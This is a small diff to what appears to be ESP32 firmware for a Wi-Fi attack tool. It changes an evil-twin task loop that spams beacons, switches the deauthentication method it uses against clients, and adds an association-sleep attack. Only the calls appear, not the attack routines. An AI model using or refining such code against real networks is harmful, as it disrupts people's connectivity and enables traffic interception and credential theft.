@@ -61,9 +61,11 @@ static void evil_twin_task(void *pvParameters)
         wifi_attack_softap_beacon_spam((target_info_t * )&target);
 
         /* Send deauth to clients */
-        //wifi_attack_deauth_basic();
-        wifi_attack_deauth_client_bad_msg1();
+        wifi_attack_deauth_basic();
+        vTaskDelay(pdMS_TO_TICKS(20));
+        //wifi_attack_deauth_client_bad_msg1();
         //wifi_attack_deauth_client_negative_tx_power();
+        wifi_attack_association_sleep();
 
         vTaskDelay(pdMS_TO_TICKS(200));
     }
